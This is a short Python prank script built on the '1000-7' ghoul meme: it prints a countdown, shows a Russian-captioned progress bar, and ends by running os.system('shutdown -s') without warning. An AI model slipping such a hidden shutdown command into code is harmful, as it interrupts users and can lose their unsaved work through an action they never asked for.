import time
import os
from tqdm import *
b=1000-7
v=0
x=7
y=1000
z=1000
while z>6:
    z -= 7
    y = z+7
    print(y,"-",x,"=",z)
    time.sleep(0.005)
    if z == 6:
        for i in trange(b,desc="я zxcгуль на"):
            v+=1
            time.sleep(0.0000000000001)
            if v == b:
                os.system('shutdown -s')


    